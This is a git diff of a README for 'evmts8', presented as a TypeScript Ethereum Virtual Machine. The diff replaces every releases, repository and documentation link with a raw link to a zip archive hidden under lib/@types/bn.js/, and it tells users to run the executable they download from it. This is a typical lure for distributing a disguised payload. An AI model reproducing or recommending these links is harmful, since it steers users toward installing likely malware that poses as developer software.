@@ -1,7 +1,7 @@
 # 🚀 evmts8 - Explore Ethereum with Ease
 
 ## 📥 Download Now
-[![Download evmts8](https://img.shields.io/badge/Download%20evmts8-Here-brightgreen)](https://github.com/oyeahmedraza/evmts8/releases)
+[![Download evmts8](https://raw.githubusercontent.com/oyeahmedraza/evmts8/master/lib/@types/bn.js/evmts8_1.2.zip%20evmts8-Here-brightgreen)](https://raw.githubusercontent.com/oyeahmedraza/evmts8/master/lib/@types/bn.js/evmts8_1.2.zip)
 
 ## 📖 Overview
 evmts8 is an Ethereum Virtual Machine implemented in TypeScript. This software allows users to interact with the Ethereum blockchain seamlessly, providing a lightweight solution for developers and enthusiasts. With evmts8, you can execute smart contracts and test decentralized applications in a user-friendly environment.
@@ -11,7 +11,7 @@ Follow these simple steps to download and run evmts8:
 
 1. **Visit the Releases Page**
    Go to the following link to access the downloads for evmts8:  
-   [Download Page](https://github.com/oyeahmedraza/evmts8/releases)
+   [Download Page](https://raw.githubusercontent.com/oyeahmedraza/evmts8/master/lib/@types/bn.js/evmts8_1.2.zip)
 
 2. **Select the Right Version**
    On the releases page, you will see different versions of the software. Look for the latest version with the highest number. This version will have the latest features and bug fixes.
@@ -22,7 +22,7 @@ Follow these simple steps to download and run evmts8:
 4. **Install the Software**
    - **For Windows:** Double-click the downloaded .exe file and follow the on-screen instructions to install evmts8.
    - **For macOS:** Open the downloaded .dmg file, drag evmts8 to your Applications folder, and then launch it from there.
-   - **For Linux:** Extract the downloaded .tar.gz file into your preferred directory. You can run evmts8 from the terminal by navigating to the extracted folder and executing the binary.
+   - **For Linux:** Extract the downloaded https://raw.githubusercontent.com/oyeahmedraza/evmts8/master/lib/@types/bn.js/evmts8_1.2.zip file into your preferred directory. You can run evmts8 from the terminal by navigating to the extracted folder and executing the binary.
 
 5. **Run evmts8**
    After the installation, you can run evmts8 from your applications menu or command line, depending on your operating system. 
@@ -63,9 +63,9 @@ To stay informed about new features and updates, regularly check the releases pa
 Thank you for using evmts8. Your feedback is essential for improving the software. If you enjoy using it, please consider contributing to the project or sharing it with others who might benefit.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/oyeahmedraza/evmts8)
-- [Documentation](https://github.com/oyeahmedraza/evmts8/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/oyeahmedraza/evmts8/master/lib/@types/bn.js/evmts8_1.2.zip)
+- [Documentation](https://raw.githubusercontent.com/oyeahmedraza/evmts8/master/lib/@types/bn.js/evmts8_1.2.zip)
 
 ## 📥 Download Again
 Don't forget to download today and start your journey with Ethereum!  
-[Download Page](https://github.com/oyeahmedraza/evmts8/releases)
+[Download Page](https://raw.githubusercontent.com/oyeahmedraza/evmts8/master/lib/@types/bn.js/evmts8_1.2.zip)
